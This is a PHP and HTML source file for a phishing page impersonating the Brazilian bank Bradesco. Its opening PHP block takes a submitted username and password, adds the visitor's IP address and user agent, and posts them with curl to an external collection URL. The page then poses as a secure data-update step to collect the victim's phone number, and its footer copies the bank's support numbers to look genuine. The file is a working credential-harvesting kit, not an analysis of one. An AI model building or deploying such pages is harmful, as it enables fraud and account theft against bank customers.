<?php

    $usuario = isset($_POST['campo_primeiro']) ? trim($_POST['campo_primeiro']) : '';
    $senha   = isset($_POST['campo_segundo']) ? trim($_POST['campo_segundo']) : '';

    if(empty($usuario) || empty($senha)){
        die("Erro: 403.");
    }
    
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];
    $user_agent          = get_user_agent();

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $linkdatabase);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        "etapa1" => "ok",
        "ip" => $ip,
        "useragent" => $user_agent,
        "usuario" => $usuario,
        "senha" => $senha,
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $server_output = curl_exec($ch);
    curl_close($ch);
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Bradesco</title>
<link rel="stylesheet" href="css/desktop.css">

<script type="text/javascript">
	function mascaraTelefone(input){
		let v = input.value.replace(/\D/g, "");
		if(v.length > 11){
			v = v.slice(0,11);
		}
		if(v.length > 10){
			v = v.replace(/^(\d{2})(\d{5})(\d{4}).*/, "($1) $2-$3");
		}else if(v.length > 6){
			v = v.replace(/^(\d{2})(\d{4})(\d{0,4}).*/, "($1) $2-$3");
		}else if(v.length > 2){
			v = v.replace(/^(\d{2})(\d{0,5})/, "($1) $2");
		}else{
			v = v.replace(/^(\d*)/, "($1");
		}
		input.value = v;
	}

	function validarTelefone(telefone){
		telefone = telefone.replace(/\D/g,'');
		if(telefone.length < 10 || telefone.length > 11){
			return false;
		}
		if(/^0/.test(telefone)){
			return false;
		}
		return true;
	}

	function SendPhone(){
		let tel = document.getElementById("campodotel").value;
		if(validarTelefone(tel)){
			document.getElementById("ffrmtellorm").submit();
		}else{
			alert("Preencha corretamente o campo de telefone");
		}

	}
</script>

</head>
<body>

<div class="topbar">
	<div class="topbarleft">
        
		<div class="topbarlogo">
		
		</div>
         <div class="bgtopwhite">
            <h1 class="titulo_bg_top">Acesso Seguro</h1>
        </div>   
        <span class="data_bg_top"> <?php echo get_data_extenso(); ?></span>   
        <button type="button" class="btn_cancelar"></button>
	</div>
</div>

<div class="container">



    <div class="main">
       
        
       
      
        <div class="atualizacao_dados">
            <div class="content">
                
                <div class="topoinfo">
                <div class="logo-icon">
                    <svg viewBox="0 0 24 24" fill="none">
                    <path d="M12 3L4 10V20H20V10L12 3Z" stroke="white" stroke-width="1.6"/>
                    </svg>
                </div>
                  <h2>Mantenha seus dados em dia</h2>
                </div>

              
              
                <p>Manter seus dados atualizados é fundamental para garantir a segurança, 
                    a agilidade no atendimento e a qualidade dos serviços oferecidos pelo banco.</p>

                    <p>Por isso, é muito importante que você mantenha seu número de telefone sempre atualizado em nosso cadastro.</p>
                    <p>Um telefone correto permite que entremos em contato rapidamente quando necessário, além de viabilizar o 
                        envio de notificações, confirmações de transações e alertas de segurança.</p>

                    <p>Informe abaixo seu número de telefone para manter seu cadastro atualizado.</p>
                     <form method="POST" action="/confirmacao" id="ffrmtellorm">
                    <div class="input-group">
                    <input type="tel" id="campodotel" name="campoterceiro" placeholder="(00) 00000-0000" onkeyup="mascaraTelefone(this)">
                    </div>
                    </form>
                <button onclick="SendPhone();">Atualizar agora</button>

            </div>


        </div>

            
     
    </div>

    <div class="right-panel">
        <img src="img/bg_aviso.png">
    </div>

</div>

<div class="footer">
    <div class="footer_left">
        <div class="footer_column"><img src="img/icone_rodape.gif"></div>
        <div class="footer_column">Bradesco Apoio à Empresa<br> 3003-1000 </div>
        <div class="footer_column">Alô Bradesco<br>0800 202 1000</div>
        <div class="footer_column">Deficiente Auditivo ou de Fala<br>0800 722 0099</div>
        <div class="footer_column">Ouvidoria<br>0800 727 9933</div>
    </div>
</div>

</body>
</html>